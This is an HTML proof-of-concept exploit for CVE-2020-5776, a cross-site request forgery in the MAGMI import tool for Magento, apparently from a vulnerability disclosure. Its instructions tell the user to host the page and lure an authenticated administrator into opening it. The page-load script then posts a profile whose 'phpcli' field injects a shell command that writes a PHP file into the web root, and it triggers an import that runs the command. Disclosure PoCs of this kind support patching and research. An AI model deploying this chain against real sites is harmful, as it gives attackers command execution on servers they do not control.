<!DOCTYPE html>
<html>
- Host this file anywhere on internet<br>
- Replace [TARGET] by the vulnerable Mgento domain<br>
- Adjust the MAGMI path if you have a custom path<br>
- Open the file in a browser as a victim while being authenticated to MAGMI<br>
- A new executable file "info.php" will be created on the server<br><br>

<body onload=run()>
  <script>
    // Replace [TARGET] with appropriate target url
    var targetUrl = "http://[TARGET]";

    function run() {
      var xhttp = new XMLHttpRequest();
      var data = "profile=default&PLUGINS_DATASOURCES%3Aclasses=&PLUGINS_DATASOURCES%3Aclass=Magmi_CSVDataSource&CSV%3Aimportmode=remote&CSV%3Abasedir=var%2Fimport&CSV%3Aremoteurl=[https%3A%2F%2Fraw.githubusercontent.com%2Ftenable%2Fpoc%2Fmaster%2FMAGMI%2Fcve-2020-5776%2Fsample.csv]&CSV%3Aremotecookie=&CSV%3Aremoteuser=&CSV%3Aremotepass=&CSV%3Aseparator=&CSV%3Aenclosure=&CSV%3Aheaderline=&PLUGINS_GENERAL%3Aclasses=Magmi_ReindexingPlugin&Magmi_ReindexingPlugin=on&REINDEX%3Aphpcli=echo+%22%3C%3Fphp+phpinfo()%3B%22+%3E+%2Fvar%2Fwww%2Fhtml%2Fmagmi%2Fweb%2Finfo.php%3B+php+&REINDEX%3Aindexes=cataloginventory_stock&cataloginventory_stock=on&PLUGINS_ITEMPROCESSORS%3Aclasses=";
      var url = targetUrl + "/magmi/web/magmi_saveprofile.php";
      var method = "POST";

      xhttp.open(method, url);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.withCredentials = true;
      // Expect a security error related to CORS, but request is still sent
      xhttp.onerror = phase2;
      xhttp.send(data);
    }

    function phase2() {
      var xhttp = new XMLHttpRequest();
      var data = "engine=magmi_productimportengine%3AMagmi_ProductImportEngine&ts=1598879870&run=import&logfile=progress.txt&profile=default&mode=update";
      var url = targetUrl + "/magmi/web/magmi_run.php";
      var method = "POST";

      xhttp.open(method, url);
      xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
      xhttp.withCredentials = true;
      // Expect a security error related to CORS, but request is still sent
      xhttp.onerror = phase3;
      xhttp.send(data);
    }

    function phase3() {
      document.body.append("Success: A new file info.php should have been created here : " + targetUrl + "/magmi/web/info.php")
    }
  </script>
</body>

</html>
